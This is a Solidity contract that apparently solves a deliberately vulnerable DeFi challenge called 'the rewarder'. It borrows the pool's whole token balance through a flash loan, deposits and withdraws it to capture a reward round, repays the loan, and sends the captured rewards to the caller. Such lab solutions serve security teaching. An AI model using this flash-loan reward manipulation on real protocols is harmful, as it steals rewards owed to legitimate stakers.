// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";

contract ExploitReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public rewardToken;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _rewardToken
    ) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
    }

    fallback() external payable {
        // Get the balance of the DVT that flash loan gave
        uint256 dvtBalance = token.balanceOf(address(this));

        // Approve allowance for this balance
        token.approve(address(rewardPool), dvtBalance);

        // Deposit so the rewards are distributed again
        rewardPool.deposit(dvtBalance);

        // Immediately withdraw
        rewardPool.withdraw(dvtBalance);

        // Transfer the token back to the pool
        // in order to have a successfull flash loan
        token.transfer(address(pool), dvtBalance);
    }

    function attack() public {
        // Request the flash loan with the balance of the flash loan pool
        pool.flashLoan(token.balanceOf(address(pool)));

        // Transfer all the rewards to me
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
